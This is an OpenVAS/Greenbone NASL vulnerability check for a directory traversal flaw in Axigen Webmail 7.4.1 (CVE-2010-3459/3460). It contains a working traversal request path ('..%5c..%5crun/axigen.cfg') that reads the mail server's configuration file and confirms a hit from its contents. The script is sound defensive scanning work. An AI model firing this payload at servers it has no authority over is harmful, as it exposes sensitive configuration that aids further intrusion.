# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:axigen:axigen_mail_server";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100805");
  script_version("2025-01-17T15:39:18+0000");
  script_tag(name:"last_modification", value:"2025-01-17 15:39:18 +0000 (Fri, 17 Jan 2025)");
  script_tag(name:"creation_date", value:"2010-09-15 18:43:03 +0200 (Wed, 15 Sep 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2010-3459", "CVE-2010-3460");

  script_name("Axigen Webmail Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/43230");
  script_xref(name:"URL", value:"http://www.axigen.com/");
  script_xref(name:"URL", value:"http://www.axigen.com/press/product-releases/axigen-releases-version-742_74.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("gb_axigen_webmail_http_detect.nasl");
  script_mandatory_keys("axigen/detected");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Vendor updates are available. Please see the references for more
  information.");

  script_tag(name:"summary", value:"Axigen Webmail is prone to a directory traversal vulnerability because it
  fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"Exploiting this issue may allow an attacker to obtain sensitive information that
  could aid in further attacks.");

  script_tag(name:"affected", value:"Axigen Webmail 7.4.1 is vulnerable. Other versions may be affected.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = string(dir, "/..%5c..%5crun/axigen.cfg");

if(http_vuln_check(port:port, url:url, pattern:"Server {", check_header: TRUE,
                   extra_check: make_list("Server: Axigen-Webmail","sslRandomFile","listeners"))) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
